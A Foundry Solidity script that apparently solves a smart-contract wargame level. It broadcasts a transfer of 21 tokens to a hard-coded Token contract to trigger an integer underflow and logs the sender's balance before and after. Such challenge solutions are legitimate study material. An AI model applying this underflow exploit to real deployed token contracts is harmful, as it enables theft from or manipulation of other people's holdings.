// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import {Script, console} from "forge-std/Script.sol";
import "../src/Token.sol";

contract TokenScript is Script {

    function setUp() public {
    }

    function run() public {
        vm.startBroadcast();

        exploit();

        vm.stopBroadcast();
    }
    function exploit() public {
        address p = 0xB0fDe4E4A8e8Bdf0A8Aea00f33f2428073cAF93C;
        Token target = Token(0xc3C3B01dA5d2e89d73e2830CFd781c316cB8652C);

        console.logUint(target.balanceOf(p));
        target.transfer(0xc3C3B01dA5d2e89d73e2830CFd781c316cB8652C, 21);
        console.logUint(target.balanceOf(p));
    }
}

